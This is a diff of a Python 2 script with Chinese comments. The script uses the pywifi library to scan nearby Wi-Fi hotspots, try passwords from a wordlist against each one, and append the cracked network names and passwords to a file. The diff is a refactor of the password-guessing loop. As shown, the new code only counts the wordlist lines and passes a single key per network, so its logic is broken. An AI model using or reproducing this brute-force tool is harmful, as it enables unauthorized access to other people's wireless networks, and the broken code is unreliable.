@@ -30,34 +30,65 @@ def scans(face, timeout):
 
 # 热点测试
 # 这里后续推荐将扫描过程数据入库，防止重复扫描，且更加直观。
-def test(i, face, x, key, stu, ts):
+# def test(i, face, x, key, stu, ts):
+#     # 显示对应网络名称，考虑到部分中文名则显示bssid
+#     showID = x.bssid if len(x.ssid) > len(x.bssid) else x.ssid
+#     # 迭代字典并进行爆破
+#     for n, k in enumerate(key):
+#         x.key = k.strip()
+#         # 移除所有热点配置
+#         face.remove_all_network_profiles()
+#         # 讲封装好的目标尝试连接
+#         face.connect(face.add_network_profile(x))
+#
+#         # 初始化状态码，考虑到用0会发生些逻辑错误
+#         code = 10
+#         t1 = time.time()
+#         # 循环刷新状态，如果置为0则密码错误，如超时则进行下一个
+#         while code != 0:
+#             time.sleep(0.1)
+#             code = face.status()
+#             now = time.time() - t1
+#             if now > ts:
+#                 break
+#
+#             stu.write("\r%-*s|%-*s|%s|%*.2fs|%-*s|%-*s%*s" % (
+#             6, i, 18, showID, code, 5, now, 7, x.signal, 10, len(key) - n, 10, k.replace("\n", "")))
+#             stu.flush()
+#             if code == 4:
+#                 face.disconnect()
+#                 return "%-*s|%s|%*s|%*s\n" % (20, x.ssid, x.bssid, 3, x.signal, 15, k)
+#
+#     return False
+
+def test(i, face, x, pwd_num, key, stu, ts):
     # 显示对应网络名称，考虑到部分中文名则显示bssid
     showID = x.bssid if len(x.ssid) > len(x.bssid) else x.ssid
     # 迭代字典并进行爆破
-    for n, k in enumerate(key):
-        x.key = k.strip()
-        # 移除所有热点配置
-        face.remove_all_network_profiles()
-        # 讲封装好的目标尝试连接
-        face.connect(face.add_network_profile(x))
+    # for n, k in enumerate(key):
+    x.key = key.strip()
+    # 移除所有热点配置
+    face.remove_all_network_profiles()
+    # 讲封装好的目标尝试连接
+    face.connect(face.add_network_profile(x))
 
-        # 初始化状态码，考虑到用0会发生些逻辑错误
-        code = 10
-        t1 = time.time()
-        # 循环刷新状态，如果置为0则密码错误，如超时则进行下一个
-        while code != 0:
-            time.sleep(0.1)
-            code = face.status()
-            now = time.time() - t1
-            if now > ts:
-                break
+    # 初始化状态码，考虑到用0会发生些逻辑错误
+    code = 10
+    t1 = time.time()
+    # 循环刷新状态，如果置为0则密码错误，如超时则进行下一个
+    while code != 0:
+        time.sleep(0.1)
+        code = face.status()
+        now = time.time() - t1
+        if now > ts:
+            break
 
-            stu.write("\r%-*s|%-*s|%s|%*.2fs|%-*s|%-*s%*s" % (
-            6, i, 18, showID, code, 5, now, 7, x.signal, 10, len(key) - n, 10, k.replace("\n", "")))
-            stu.flush()
-            if code == 4:
-                face.disconnect()
-                return "%-*s|%s|%*s|%*s\n" % (20, x.ssid, x.bssid, 3, x.signal, 15, k)
+        stu.write("\r%-*s|%-*s|%s|%*.2fs|%-*s|%-*s%*s" % (
+        6, i, 18, showID, code, 5, now, 7, x.signal, 10, pwd_num, 10, key.replace("\n", "")))
+        stu.flush()
+        if code == 4:
+            face.disconnect()
+            return "%-*s|%s|%*s|%*s\n" % (20, x.ssid, x.bssid, 3, x.signal, 15, key)
 
     return False
 
@@ -72,10 +103,13 @@ def main():
     # 字典列表 super_keys
     file_path = os.path.abspath('../../../test.txt')
     print file_path
-    while 1:
-        key = open(file_path, "r").readline()
-        if not key:
-            break
+    # 密码编号
+    pwd_num = 0
+    with open(file_path, 'r') as f:
+        for key in f:
+            if not key:
+                break
+            pwd_num = pwd_num + 1
     # keys = open(file_path, "r").readlines()
     # print"|KEYS %s" % (len(keys))
     # 实例化一个pywifi对象
@@ -93,7 +127,8 @@ def main():
     # 将每一个热点信息逐一进行测试
     for i, x in enumerate(scanres):
         # 测试完毕后，成功的结果讲存储到files中
-        res = test(nums - i, iface, x, key, output, testtimes)
+        res = test(nums - i, iface, x, pwd_num, key, output, testtimes)
+        # res = test(nums - i, iface, x, key, output, testtimes)
         print res
         if res:
             open(files, "a").write(res)
